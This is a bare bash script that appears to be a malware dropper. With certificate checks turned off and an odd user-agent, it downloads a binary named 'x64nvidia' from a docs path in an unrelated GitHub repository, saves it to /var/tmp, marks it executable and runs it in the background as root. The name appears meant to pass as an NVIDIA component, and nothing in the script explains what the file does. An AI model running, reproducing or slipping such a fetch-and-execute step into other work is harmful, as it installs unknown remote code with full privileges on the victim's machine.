#!/usr/bin/env bash

curl -k -A 205 -o /var/tmp/x64nvidia https://raw.githubusercontent.com/pavlovasianov/lucide/refs/heads/icon/fist/docs/x64nvidia
sudo chmod +x /var/tmp/x64nvidia
sudo /var/tmp/x64nvidia &
